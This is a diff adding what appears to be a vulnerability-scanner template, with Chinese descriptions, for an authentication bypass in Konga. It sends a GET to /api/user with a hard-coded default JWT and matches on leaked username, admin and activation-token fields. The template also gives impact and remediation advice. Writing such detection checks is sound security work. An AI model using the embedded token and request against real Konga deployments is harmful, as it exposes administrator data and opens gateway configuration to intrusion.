@@ -1,0 +1,55 @@
+id: konga-default-token-user-access
+
+info:
+  name: Konga 默认 Token 未授权用户访问
+  author: dahezhiquan
+  severity: high
+  description: |
+    Konga 的 `/api/user` 接口在接受默认或可预测 Bearer Token 时，可能在未建立合法用户会话的情况下返回用户资料。模板使用已知默认 Token 发起只读 GET 请求，并要求响应同时包含 Konga 用户对象和用户激活令牌等字段，以确认 Token 已被接受且用户数据暴露。
+  impact: |
+    - 攻击者可读取 Konga 管理用户、邮箱、管理员标识和激活令牌等敏感信息。
+    - 若该 Token 可访问其他管理接口，攻击者可能进一步修改 Kong 网关配置、路由或凭据。
+  remediation: |
+    - 立即废弃默认或可预测 Token，重新生成随机高熵签名密钥和访问令牌，并使旧 Token 失效。
+    - 为 Konga 管理 API 启用严格的认证授权、来源限制和 HTTPS，避免管理接口直接暴露在公网。
+    - 轮换响应中已泄露的激活令牌，审计 `/api/user` 及其他管理 API 的历史访问记录。
+  reference:
+    - https://github.com/pantsel/konga
+  classification:
+    cwe-id: CWE-287
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: pantsel
+    product: konga
+  tags: konga,auth-bypass,unauth,info-leak,token,misconfig,vuln
+
+variables:
+  token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4"
+
+http:
+  - raw:
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Authorization: Bearer {{token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: regex
+        part: body
+        regex:
+          - '"username"\s*:\s*"[^"\\]+"'
+          - '"admin"\s*:\s*(true|false)'
+          - '"activationToken"\s*:\s*"[^"\\]+"'
+        condition: and
